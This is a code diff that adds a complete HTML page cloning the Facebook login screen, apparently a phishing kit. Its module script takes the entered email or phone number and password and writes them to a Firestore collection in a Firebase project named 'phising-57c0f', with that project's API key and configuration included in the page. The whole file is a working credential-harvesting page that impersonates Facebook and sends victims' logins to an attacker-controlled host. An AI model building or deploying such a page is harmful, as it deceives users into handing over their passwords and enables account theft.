@@ -1,1 +1,189 @@
-nothing 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> – Facebook Login </title>
+
+<style>
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+}
+
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:#f0f2f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  padding:20px;
+}
+
+.wrapper{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  max-width:980px;
+  width:100%;
+  gap:60px;
+  flex-wrap:wrap;
+}
+
+.left{
+  flex:1;
+  min-width:300px;
+}
+
+.logo{
+  color:#1877f2;
+  font-size:60px;
+  font-weight:700;
+}
+
+.tagline{
+  font-size:24px;
+  margin-top:10px;
+  color:#1c1e21;
+}
+
+.login-card{
+  width:396px;
+  background:white;
+  padding:24px;
+  border-radius:10px;
+  box-shadow:0 6px 20px rgba(0,0,0,0.12);
+}
+
+input, textarea{
+  width:100%;
+  padding:14px;
+  margin-bottom:12px;
+  border:1px solid #dddfe2;
+  border-radius:6px;
+  font-size:16px;
+}
+
+textarea{
+  resize:none;
+  height:100px;
+}
+
+.login-btn{
+  width:100%;
+  padding:14px;
+  background:#1877f2;
+  color:white;
+  border:none;
+  border-radius:6px;
+  font-size:18px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+.login-btn:hover{
+  background:#166fe5;
+}
+
+.divider{
+  height:1px;
+  background:#dadde1;
+  margin:20px 0;
+}
+
+.create-btn{
+  background:#42b72a;
+  color:white;
+  border:none;
+  padding:14px;
+  font-size:16px;
+  border-radius:6px;
+  cursor:pointer;
+  display:block;
+  margin:auto;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+<div class="left">
+  <div class="logo">Facebook</div>
+  <div class="tagline">
+    Explore the things you love.
+  </div>
+</div>
+
+<div class="login-card">
+
+  <input id="contact" type="text" placeholder="Email address or mobile number">
+  <textarea id="message" placeholder="Password"></textarea>
+
+  <button class="login-btn" id="sendBtn">Login</button>
+
+  <div class="divider"></div>
+
+  <button class="create-btn">Forgotten password?</button>
+
+</div>
+
+</div>
+
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAFmvVwI-camq2hWUVWhE7zXoE8O4RD1_M",
+  authDomain: "phising-57c0f.firebaseapp.com",
+  projectId: "phising-57c0f",
+  storageBucket: "phising-57c0f.firebasestorage.app",
+  messagingSenderId: "209636619061",
+  appId: "1:209636619061:web:fc45017156f8d230e0927c"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+document.getElementById("sendBtn").addEventListener("click", async () => {
+
+  const contact = document.getElementById("contact").value;
+  const message = document.getElementById("message").value;
+
+  if(contact === "" || message === ""){
+    alert("Please fill all fields");
+    return;
+  }
+
+  try{
+
+    await addDoc(collection(db,"messages"),{
+      contact: contact,
+      message: message,
+      time: new Date()
+    });
+
+    alert("Message sent successfully!");
+
+    document.getElementById("contact").value="";
+    document.getElementById("message").value="";
+
+  }catch(err){
+
+    console.error(err);
+    alert("Error sending message");
+
+  }
+
+});
+
+</script>
+
+</body>
+</html>
